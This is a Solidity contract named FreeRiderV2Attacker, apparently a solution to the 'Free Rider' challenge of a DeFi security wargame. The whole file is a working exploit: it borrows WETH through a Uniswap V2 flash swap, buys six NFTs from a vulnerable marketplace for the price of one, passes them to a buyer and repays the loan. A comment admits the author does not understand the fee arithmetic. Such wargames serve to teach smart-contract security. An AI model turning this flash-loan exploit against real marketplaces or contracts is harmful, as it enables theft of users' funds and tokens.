pragma solidity =0.6.6;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";

import "hardhat/console.sol";

interface IFreeRiderNFTMarketplace {
    function getToken() external returns (address);

    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);

    function safeTransferFrom(
        address _from,
        address _to,
        uint256 _tokenId
    ) external payable;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract FreeRiderV2Attacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private immutable pair;
    IWETH private immutable weth;
    IERC20 private immutable dvt;
    IERC721 private immutable nft;

    address private immutable buyer;
    address private immutable attacker;

    IFreeRiderNFTMarketplace private immutable marketplace;

    uint256 private constant NUM_NFTS = 6;
    uint256 private constant NFT_PRICE = 15 * 10**18;

    constructor(
        address routerAddress,
        address pairAddress,
        address buyerAddress,
        address attackerAddress,
        address marketplaceAddress,
        address nftAddress
    ) public {
        IUniswapV2Router02 _router = IUniswapV2Router02(routerAddress);
        buyer = buyerAddress;
        attacker = attackerAddress;
        IUniswapV2Pair _pair = IUniswapV2Pair(pairAddress);
        pair = _pair;
        weth = IWETH(_router.WETH());
        require(
            _router.WETH() == _pair.token0(),
            "Unexpected pair configuration"
        );
        dvt = IERC20(_pair.token1());
        marketplace = IFreeRiderNFTMarketplace(marketplaceAddress);
        nft = IERC721(nftAddress);
    }

    function execute() external payable {
        pair.swap(NFT_PRICE, 0, address(this), abi.encode(1));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external override {
        require(sender == address(this), "Unknown sender");
        require(
            IUniswapV2Pair(msg.sender).token0() == address(weth),
            "Unknown token 0"
        );
        require(
            IUniswapV2Pair(msg.sender).token1() == address(dvt),
            "Unknown token 1"
        );
        require(msg.sender == address(pair), "Unknown caller"); // ensure that msg.sender is a V2 pair
        require(amount0 == NFT_PRICE, "Wrong amount0");
        require(amount1 == 0, "Wrong amount1");

        weth.withdraw(amount0);
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < NUM_NFTS; i++) {
            ids[i] = i;
        }

        console.log("ETH balance before: %s.", address(this).balance);

        marketplace.buyMany{value: amount0}(ids);

        for (uint256 i = 0; i < NUM_NFTS; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }

        console.log("ETH balance after: %s.", address(this).balance);

        console.log("Whitdrawn: %s.", amount0);
        uint256 toReturn = (amount0 * 10000) / 9969;  // Don't know why this doesn't work with 997
        console.log("To return: %s.", toReturn);

        weth.deposit{value: toReturn}();
        weth.transfer(msg.sender, toReturn);

        console.log("Marketplace balance after: %s.", address(marketplace).balance);
        console.log("Attacker balance after: %s.", attacker.balance);
    }

    receive() external payable {
        // console.log("Got paid! %s.", msg.value);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        // TODO: Check all inputs here.
        return IERC721Receiver.onERC721Received.selector;
    }
}
